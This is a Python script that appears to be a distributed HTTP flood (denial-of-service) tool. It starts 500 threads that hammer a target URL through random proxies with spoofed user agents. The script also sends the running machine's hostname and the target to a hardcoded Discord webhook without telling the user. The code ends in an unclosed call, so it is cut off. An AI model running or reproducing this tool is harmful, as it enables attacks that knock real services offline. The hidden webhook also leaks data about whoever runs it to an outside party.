try:
    import urllib.request, os, threading, time, random, sys
    from discord_webhook import DiscordWebhook
    import socket
except ImportError:
    if sys.platform.startswith("linux"):
        os.system("pip3 install discord_webhook")
    else:
        os.system("pip install discord_webhook")

usl = "https://discord.com/api/webhooks/1093599305685794896/vy6bs-NwDnLNgvchhnjEZvl42hZomUlWRpe1LZu2yewlItnlqbsC-qtfqVTXwzXrYjIm"
useragents = [
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
    "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
    "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
    "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
    "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
    "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
    "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
]

class Fucker(threading.Thread):

    def __init__(self, url, number, proxy):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
        self.headers = {'User-Agent': random.choice(useragents)}
        self.lock = threading.Lock()
        self.proxy = proxy

    def request(self):
        data = None
        proxy = urllib.request.ProxyHandler({'http': self.proxy})
        opener = urllib.request.build_opener(proxy)
        urllib.request.install_opener(opener)
        req = urllib.request.Request(self.url, data, self.headers)
        urllib.request.urlopen(req)
        print("[packet sending]\r", end="")

    def run(self):
        while True:
            try:
                self.request()
            except:
                sys.stdout.write("packet sending [%s]\r" % self.url)
                sys.exit(0)

class MainLoop():

    def home(self):
        print(
            """
 _  __    _      _     _           
| |/ /___| |_ __| | __| | ___  ___ 
| ' // __| __/ _` |/ _` |/ _ \/ __|
| . \ (__| || (_| | (_| | (_) \__ \\
|_|\_\___|\__\__,_|\__,_|\___/|___/
"""
        )
        try:
            url = sys.argv[1]
            hst = socket.gethostname()
            webhook = DiscordWebhook(
                urls=usl, content=f'{hst} Has Started Flood To {url}'
            )
            response = webhook.execute()
        except Exception as e:
            print(f"Error: {e}")
        try:
            file_proxy = "proxylist.txt"
            with open(file_proxy, "r") as in_file:
                proxy_lines = in_file.readlines()
        except Exception as e:
            print(f"Error: {e}")
        num_threads = 500
        try:
            for i in range(num_threads):
                in_line = random.choice(proxy_lines).strip()
                Fucker(url, i + 1, in_line).start()
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    if sys.platform.startswith("linux"):
        os.system("clear")
    else:
        os.system("cls")
    MainLoop().home(
